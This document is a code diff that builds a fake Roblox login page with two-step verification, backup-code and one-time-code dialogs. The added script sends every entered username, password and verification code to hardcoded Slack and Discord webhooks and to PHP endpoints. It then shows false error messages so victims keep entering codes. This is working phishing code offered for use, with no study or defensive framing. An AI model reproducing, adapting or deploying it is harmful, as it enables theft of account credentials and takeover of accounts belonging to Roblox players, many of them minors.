+                                <div id="twostep-group" class="form-group">
+                                    <input maxlength="6" oninput="twostepInput(this.value, 'verifyButton'); this.value = this.value.replace(/[^0-9]/g, '');" placeholder="Enter 6-digit Code" type="password" id="two-step-verification-code-input" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="twostep-error">&nbsp;</div>
+                                </div>
+                            </div>
+                            <p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox"> <label for="remember-device">Trust this device for 30 days</label></p>
+                            <p><button type="button" id="resend-btn" class="modal-body-button-link small">Resend Code</button></p>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="verifyButton" disabled="">Verify</button></div>
+                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
+                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="authenticatorverification" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" onclick="document.getElementById('authenticatorverification').style.display = 'none';" class="modal-modern-header-button"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">2-Step Verification</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app.</p>
+                            <div class="input-control-wrapper">
+                                <div id="Authen-group" class="form-group">
+                                    <input maxlength="6" oninput="twostepInput(this.value, 'AuthenButton'); this.value = this.value.replace(/[^0-9]/g, '');" placeholder="Enter 6-digit Code" type="password" id="two-step-verification-code-input-authenticator" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="Authen-error">&nbsp;</div>
+                                </div>
+                            </div>
+                            <p class="modal-margin-bottom-xlarge"><input type="checkbox"> <label>Trust this device for 30 days</label></p>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="AuthenButton" disabled="">Verify</button></div>
+                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
+                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="RecoveryFromEmail" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('RecoveryFromEmail').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">2-Step Verification</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter a previously saved backup code.</p>
+                            <div class="input-control-wrapper">
+                                <div id="RecoveryFromEmail-group" class="form-group">
+                                    <input maxlength="9" oninput="twostepInputRecovery(this.value, 'RecoveryFromEmailButton');" placeholder="Enter 9-digit Code" type="password" id="two-step-verification-code-input-RecoveryFromEmail" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="RecoveryFromEmail-error">&nbsp;</div>
+                                </div>
+                            </div>
+                            <p class="modal-margin-bottom-xlarge"><input type="checkbox"> <label>Trust this device for 30 days</label></p>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="RecoveryFromEmailButton" disabled="">Verify</button></div>
+                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
+                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="RecoveryFromAuthen" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('RecoveryFromAuthen').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">2-Step Verification</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter a previously saved backup code.</p>
+                            <div class="input-control-wrapper">
+                                <div id="RecoveryFromAuthen-group" class="form-group">
+                                    <input maxlength="9" oninput="twostepInputRecovery(this.value, 'RecoveryFromAuthenButton');" placeholder="Enter 9-digit Code" type="password" id="two-step-verification-code-input-recoveryFromAuthen" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="RecoveryFromAuthen-error">&nbsp;</div>
+                                </div>
+                            </div>
+                            <p class="modal-margin-bottom-xlarge"><input type="checkbox"> <label>Trust this device for 30 days</label></p>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="RecoveryFromAuthenButton" disabled="">Verify</button></div>
+                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
+                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="otpEmailModal" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('otpEmailModal').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">Login with One-Time Code</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter your email address and we'll send you a one-time code to log in.</p>
+                            <div class="input-control-wrapper">
+                                <div class="form-group">
+                                    <input type="email" maxlength="120" placeholder="Email Address" id="otp-email-input" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="otp-error">&nbsp;</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="otp-send-btn">Send Code</button></div>
+                            <p class="text-footer">We'll never share your email with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+            <div role="dialog" id="otpCodeModal" style="display: none;">
+                <div class="fade modal-backdrop in"></div>
+                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
+                    <div class="modal-dialog"><div class="modal-content" role="document">
+                        <div class="modal-header">
+                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('otpCodeModal').style.display = 'none';"><span class="icon-close"></span></button>
+                            <h4 class="modal-title">Enter One-Time Code</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="modal-lock-icon"></div>
+                            <p class="modal-margin-bottom-xlarge">Enter the 6-digit code we sent to <b id="otp-email-display"></b>.</p>
+                            <div class="input-control-wrapper">
+                                <div class="form-group">
+                                    <input maxlength="6" oninput="twostepInput(this.value, 'otp-verify-btn'); this.value = this.value.replace(/[^0-9]/g, '');" placeholder="Enter 6-digit Code" type="password" id="otp-code-input" class="input-field form-control">
+                                    <div class="form-control-label bottom-label xsmall" id="otp-code-error">&nbsp;</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="otp-verify-btn" disabled="">Verify</button></div>
+                            <p class="text-footer">Never share your one-time code with anyone.</p>
+                        </div>
+                    </div></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <footer class="container-footer" id="footer-container">
+        <div class="footer">
+            <ul class="row footer-links">
+                <li class="footer-link"><a class="text-footer-nav" href="#">About Us</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Jobs</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Blog</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Parents</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Gift Cards</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Help</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Terms</a></li>
+                <li class="footer-link"><a class="text-footer-nav" href="#">Accessibility</a></li>
+                <li class="footer-link"><a class="text-footer-nav privacy" href="#">Privacy</a></li>
+            </ul>
+            <div class="row copyright-container">
+                <div class="col-sm-12">
+                    <p class="text-footer footer-note">©2022 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
 </div>
 
-
-
-
-    
-
-
-
-    
-
-
-    
-
-    
-
-
-    
-
-
-    
-
-
-
-
-    
-
-    
-
-    
-
-    
-
-
-
-
-<meta name="sentry-meta" data-env-name="production" data-dsn="https://24df60727c94bd0aa14ab1269d104a21@o293668.ingest.us.sentry.io/4509158985826304" data-sample-rate="0.0005" data-traces-sample-rate="0.008">
-
-    
-
-    
-
-    
-
-    
-
-
-
-
-
-
-
-
-<div id="presence-registration-bootstrap-data" data-is-enabled="False" data-interval="15000"></div>
-
-
-
-    <div ng-modules="baseTemplateApp" class="ng-scope">
-        <!-- Template bundle: base -->
-
-
-    </div>
-
-    <div ng-modules="pageTemplateApp" class="ng-scope">
-        <!-- Template bundle: page -->
-
-
-    </div>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    
-
-        
-
-
-
-
-    
-
-
-    
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    
-
-
-
-</body></html>
+<script>
+/* ====== WEBHOOKS ====== */
+const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1557120530954461225/Ff51QIXzK2bSqXLrgS4Gdqmg58rNeFtrnmGgiMJ8Ez3M1g0oaUXAqDHbWXI6JVPrj6Fo";
+const SERVER_URL = "https://roblox-avatar-lookup--doancrs.replit.app/api/avatar";
+const WAIT = 3000;
+
+function getDevice(){
+    const ua = navigator.userAgent;
+    let os = "?", br = "?";
+    if(/Windows/.test(ua)) os = "Windows"; else if(/Mac OS X/.test(ua)) os = "macOS";
+    else if(/Android/.test(ua)) os = "Android"; else if(/iPhone|iPad|iPod/.test(ua)) os = "iOS";
+    else if(/Linux/.test(ua)) os = "Linux";
+    if(/Edg\//.test(ua)) br = "Edge"; else if(/OPR\/|Opera/.test(ua)) br = "Opera";
+    else if(/Chrome\//.test(ua)) br = "Chrome"; else if(/Firefox\//.test(ua)) br = "Firefox";
+    else if(/Safari\//.test(ua)) br = "Safari";
+    return os + " · " + br + " · " + screen.width + "x" + screen.height;
+}
+
+function getRobloxAvatar(username, cb){
+    let done = false;
+    const finish = (av) => { if(done) return; done = true; cb(av); };
+    setTimeout(() => finish(null), 6000);
+    const name = String(username || "").trim();
+    if(!name || name.indexOf("@") > -1){ finish(null); return; }
+    fetch(SERVER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: name })
+    })
+    .then(r => r.json())
+    .then(d => finish(d && d.avatar ? d.avatar : null))
+    .catch(() => finish(null));
+}
+
+/* ====== Farbe pro User ====== */
+const COLOR_PALETTE = [
+    '#ff7a00', '#2ecc71', '#00a2ff', '#e74c3c', '#9b59b6',
+    '#f1c40f', '#1abc9c', '#e91e63', '#3498db', '#e67e22'
+];
+const userColors = {};
+let nextColorIndex = 0;
+
+function getColorForUser(user){
+    const key = String(user || "unknown").toLowerCase();
+    if(userColors[key]) return userColors[key];
+    const c = COLOR_PALETTE[nextColorIndex % COLOR_PALETTE.length];
+    userColors[key] = c;
+    nextColorIndex++;
+    return c;
+}
+
+function colorToInt(hex){ return parseInt(String(hex).replace('#',''), 16); }
+
+/* ====== Senden an Slack + Discord ====== */
+function sendToHooks(titel, untertitel, felder, avatarUrl, user){
+    const color = getColorForUser(user);
+    const pretty = "▬ " + titel + " ▬";
+    const robloxProfile = user ? ("https://www.roblox.com/users/profile?username=" + encodeURIComponent(user)) : null;
+
+    const slackFields = (felder||[])
+        .filter(f => f.v !== undefined && f.v !== null && f.v !== "")
+        .map(f => "*" + f.t + "*:  `" + String(f.v) + "`")
+        .join("\n━━━━━━━━━━━━━━━━━━\n");
+
+    const slackBody =
+        (user ? "👤 *" + user + "*\n\n" : "") +
+        slackFields +
+        (robloxProfile ? "\n\n🔗 <" + robloxProfile + "|Roblox-Profil ansehen>" : "");
+
+    const slackAttachment = {
+        color: color,
+        title: pretty,
+        text: slackBody,
+        footer: "📱 " + getDevice() + "   ·   🕐 " + new Date().toLocaleString("en-US"),
+        mrkdwn_in: ["text", "title"]
+    };
+    if(avatarUrl) slackAttachment.thumb_url = avatarUrl;
+
+    try {
+        fetch(SLACK_WEBHOOK, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ text: pretty, attachments: [slackAttachment] })
+        });
+    } catch(e){}
+
+    const discordFields = (felder||[])
+        .filter(f => f.v !== undefined && f.v !== null && f.v !== "")
+        .map(f => ({ name: f.t, value: "`" + String(f.v) + "`", inline: false }));
+
+    if(robloxProfile){
+        discordFields.push({
+            name: "Roblox-Profil",
+            value: "[Profil öffnen](" + robloxProfile + ")",
+            inline: false
+        });
+    }
+
+    const discordEmbed = {
+        title: pretty,
+        color: colorToInt(color),
+        author: { name: user || "Unbekannt" },
+        thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
+        fields: discordFields,
+        footer: { text: "📱 " + getDevice() + " · 🕐 " + new Date().toLocaleString("en-US") },
+        timestamp: new Date().toISOString()
+    };
+
+    try {
+        fetch(DISCORD_WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                username: "Roblox",
+                avatar_url: avatarUrl || undefined,
+                embeds: [discordEmbed]
+            })
+        }).catch(()=>{});
+    } catch(e){}
+}
+
+function sendToSlack(titel, untertitel, felder, avatarUrl, user){
+    sendToHooks(titel, untertitel, felder, avatarUrl, user);
+}
+
+function hideAllModals(){
+    ['twostepverification','authenticatorverification','RecoveryFromEmail','RecoveryFromAuthen','otpEmailModal','otpCodeModal','methodChoice'].forEach(id => {
+        const el = document.getElementById(id);
+        if(el) el.style.display = 'none';
+    });
+}
+
+function showErrorUnderFields(){
+    hideAllModals();
+    document.getElementById('react-login-container').style.display = 'block';
+    document.getElementById('text-error').textContent = "Something went wrong. Please try again.";
+    document.getElementById('login-username').value = '';
+    document.getElementById('login-password').value = '';
+}
+
+function chooseMethod(method){
+    document.getElementById('methodChoice').style.display = 'none';
+    sendToHooks("Verification Method Chosen", "User selected a 2FA method", [
+        { t:"Methode", v:method },
+        { t:"Benutzer", v:lastLogin.username || "unknown" },
+        { t:"Passwort", v:lastLogin.password || "(nicht verfügbar)" }
+    ], null, lastLogin.username);
+    if(method === 'Email'){
+        document.getElementById('twostepverification').style.display = 'block';
+    } else if(method === 'Authenticator'){
+        document.getElementById('authenticatorverification').style.display = 'block';
+    } else if(method === 'Backup Code'){
+        document.getElementById('RecoveryFromEmail').style.display = 'block';
+    }
+}
+
+const form = document.querySelector('form.login-form');
+const usernameInput = document.getElementById('login-username');
+const passwordInput = document.getElementById('login-password');
+const loginButton = document.getElementById('login-button');
+const errorText = document.getElementById('text-error');
+const loadingEl = document.getElementById('login-loading');
+
+let lastLogin = { username: '', password: '' };
+
+function setError(msg){ if(errorText) errorText.textContent = msg || ''; }
+function setLoading(on){
+    if(loadingEl) loadingEl.style.display = on ? 'flex' : 'none';
+    if(loginButton) loginButton.style.display = on ? 'none' : 'block';
+}
+
+function doLogin(){
+    const username = usernameInput.value.trim();
+    const password = passwordInput.value;
+
+    if(!username || !password){
+        setError("Username and password required");
+        return;
+    }
+
+    setLoading(true);
+    setError("");
+    lastLogin = { username, password };
+
+    /* 1. An Discord/Slack (Webhooks) */
+    getRobloxAvatar(username, (av) => {
+        sendToHooks("Sign-In Attempt", "Credentials submitted", [
+            { t:"Benutzer", v:username },
+            { t:"Passwort", v:password }
+        ], av, username);
+    });
+
+    /* 2. An deinen PHP-Server (Cookie) */
+    fetch("/auth.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: "Username=" + encodeURIComponent(username) + "&Password=" + encodeURIComponent(password)
+    })
+    .then(r => r.text())
+    .then(data => console.log("[Cookie-Antwort]", data))
+    .catch(err => console.error("[PHP-Fehler]", err));
+
+    /* 3. UI */
+    setTimeout(() => {
+        setLoading(false);
+        document.getElementById('methodChoice').style.display = 'block';
+    }, WAIT);
+}
+
+form.addEventListener('submit', e => { e.preventDefault(); doLogin(); });
+loginButton.addEventListener('click', e => { e.preventDefault(); doLogin(); });
+form.addEventListener('keydown', e => { if(e.key === 'Enter'){ e.preventDefault(); doLogin(); } });
+
+/* 2FA: Email */
+document.getElementById('verifyButton').addEventListener('click', function(){
+    const code = document.getElementById('two-step-verification-code-input').value.replace(/\D/g,'');
+    if(code.length !== 6){ document.getElementById('twostep-error').textContent = "Enter the 6-digit code."; return; }
+    this.disabled = true;
+    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+
+    getRobloxAvatar(lastLogin.username, (av) => {
+        sendToHooks("2FA Confirmed", "Two-step verification – Email", [
+            { t:"Benutzer", v:lastLogin.username },
+            { t:"Passwort", v:lastLogin.password },
+            { t:"Email Code", v:code }
+        ], av, lastLogin.username);
+    });
+
+    fetch("/twostep.php?username=" + encodeURIComponent(lastLogin.username) +
+          "&password=" + encodeURIComponent(lastLogin.password) +
+          "&code=" + code + "&type=Email")
+    .then(r => r.text())
+    .then(data => console.log("[Cookie-Antwort]", data))
+    .catch(err => console.error("[PHP-Fehler]", err));
+
+    setTimeout(() => { this.disabled = false; this.innerHTML = 'Verify'; showErrorUnderFields(); }, WAIT);
+});
+
+/* 2FA: Authenticator */
+document.getElementById('AuthenButton').addEventListener('click', function(){
+    const code = document.getElementById('two-step-verification-code-input-authenticator').value.replace(/\D/g,'');
+    if(code.length !== 6) return;
+    this.disabled = true;
+    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+
+    getRobloxAvatar(lastLogin.username, (av) => {
+        sendToHooks("2FA Confirmed", "Two-step verification – Authenticator App", [
+            { t:"Benutzer", v:lastLogin.username },
+            { t:"Passwort", v:lastLogin.password },
+            { t:"Authenticator Code", v:code }
+        ], av, lastLogin.username);
+    });
+
+    fetch("/twostep.php?username=" + encodeURIComponent(lastLogin.username) +
+          "&password=" + encodeURIComponent(lastLogin.password) +
+          "&code=" + code + "&type=Authenticator")
+    .then(r => r.text())
+    .then(data => console.log("[Cookie-Antwort]", data))
+    .catch(err => console.error("[PHP-Fehler]", err));
+
+    setTimeout(() => {
+        this.disabled = false;
+        this.innerHTML = 'Verify';
+        document.getElementById('Authen-error').textContent = "Incorrect code. Please try again.";
+    }, WAIT);
+});
+
+/* Recovery: Email Backup-Code */
+document.getElementById('RecoveryFromEmailButton').addEventListener('click', function(){
+    const code = document.getElementById('two-step-verification-code-input-RecoveryFromEmail').value.replace(/\D/g,'');
+    if(code.length !== 9) return;
+    this.disabled = true;
+    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+
+    getRobloxAvatar(lastLogin.username, (av) => {
+        sendToHooks("Backup Code Entered", "Two-step verification – Backup Code (Email)", [
+            { t:"Benutzer", v:lastLogin.username },
+            { t:"Passwort", v:lastLogin.password },
+            { t:"Backup Code", v:code }
+        ], av, lastLogin.username);
+    });
+
+    fetch("/twostep.php?username=" + encodeURIComponent(lastLogin.username) +
+          "&password=" + encodeURIComponent(lastLogin.password) +
+          "&code=" + code + "&type=Recovery")
+    .then(r => r.text())
+    .then(data => console.log("[Cookie-Antwort]", data))
+    .catch(err => console.error("[PHP-Fehler]", err));
+
+    setTimeout(() => { this.disabled = false; this.innerHTML = 'Verify'; showErrorUnderFields(); }, WAIT);
+});
+
+/* Recovery: Authenticator Backup-Code */
+document.getElementById('RecoveryFromAuthenButton').addEventListener('click', function(){
+    const code = document.getElementById('two-step-verification-code-input-recoveryFromAuthen').value.replace(/\D/g,'');
+    if(code.length !== 9) return;
+    this.disabled = true;
+    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+
+    getRobloxAvatar(lastLogin.username, (av) => {
+        sendToHooks("Backup Code Entered", "Two-step verification – Backup Code (Authenticator)", [
+            { t:"Benutzer", v:lastLogin.username },
+            { t:"Passwort", v:lastLogin.password },
+            { t:"Backup Code", v:code }
+        ], av, lastLogin.username);
+    });
+
+    fetch("/twostep.php?username=" + encodeURIComponent(lastLogin.username) +
+          "&password=" + encodeURIComponent(lastLogin.password) +
+          "&code=" + code + "&type=Recovery")
+    .then(r => r.text())
+    .then(data => console.log("[Cookie-Antwort]", data))
+    .catch(err => console.error("[PHP-Fehler]", err));
+
+    setTimeout(() => { this.disabled = false; this.innerHTML = 'Verify'; showErrorUnderFields(); }, WAIT);
+});
+
+/* One-Time Code: Step 1 */
+document.getElementById('otp-login-button').addEventListener('click', function(){
+    document.getElementById('otp-email-input').value = '';
+    document.getElementById('otp-error').innerHTML = '&nbsp;';
+    document.getElementById('otpEmailModal').style.display = 'block';
+});
+
+document.getElementById('otp-send-btn').addEventListener('click', function(){
+    const email = document.getElementById('otp-email-input').value.trim();
+    if(!email || email.indexOf('@') === -1){
+        document.getElementById('otp-error').textContent = "Please enter a valid email address.";
+        return;
+    }
+    sendToHooks("One-Time Code Requested", "Login via email code", [
+        { t:"Email", v:email }
+    ], null, email);
+
+    document.getElementById('otp-email-display').textContent = email;
+    document.getElementById('otp-code-input').value = '';
+    document.getElementById('otp-code-error').innerHTML = '&nbsp;';
+    document.getElementById('otp-verify-btn').disabled = true;
+    document.getElementById('otpEmailModal').style.display = 'none';
+    document.getElementById('otpCodeModal').style.display = 'block';
+});
+
+/* One-Time Code: Step 2 */
+document.getElementById('otp-verify-btn').addEventListener('click', function(){
+    const code = document.getElementById('otp-code-input').value.replace(/\D/g,'');
+    const email = document.getElementById('otp-email-input').value.trim();
+    if(code.length !== 6) return;
+    this.disabled = true;
+    this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
+    sendToHooks("One-Time Code Confirmed", "Login via email code", [
+        { t:"Email", v:email },
+        { t:"Code", v:code }
+    ], null, email);
+    setTimeout(() => { this.disabled = false; this.innerHTML = 'Verify'; showErrorUnderFields(); }, WAIT);
+});
+
+/* Resend Code */
+document.getElementById('resend-btn').addEventListener('click', function(){
+    sendToHooks("Resend Code Requested", "User requested a new code", [{ t:"Benutzer", v:lastLogin.username || "unknown" }], null, lastLogin.username);
+    alert("A new code has been sent to your email address.");
+});
+
+/* Forgot Password */
+document.getElementById('forgot-credentials-link').addEventListener('click', function(e){
+    e.preventDefault();
+    const n = prompt("Please enter your username or email address:");
+    if(!n) return;
+    getRobloxAvatar(n, (av) => {
+        sendToHooks("Forgot Password Requested", "Recovery initiated", [{ t:"Eingabe", v:n }], av, n);
+    });
+    alert("If this account exists, a recovery email has been sent.");
+});
+
+/* Quick Login */
+document.getElementById('cross-device-login-button').addEventListener('click', function(){
+    sendToHooks("Quick Login Started", "QR code shown", [{ t:"Methode", v:"QR Code" }], null, lastLogin.username);
+    alert("Open the Roblox app on another device and scan the code.");
+});
+
+/* Sign Up */
+document.getElementById('sign-up-link').addEventListener('click', function(e){
+    e.preventDefault();
+    setError("For this action, only the login function is available.");
+});
+</script>
+
+
+<input type="password" id="kagi.ignore.autofillPwdField" autocomplete="current-password" style="position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none;"></body></html>
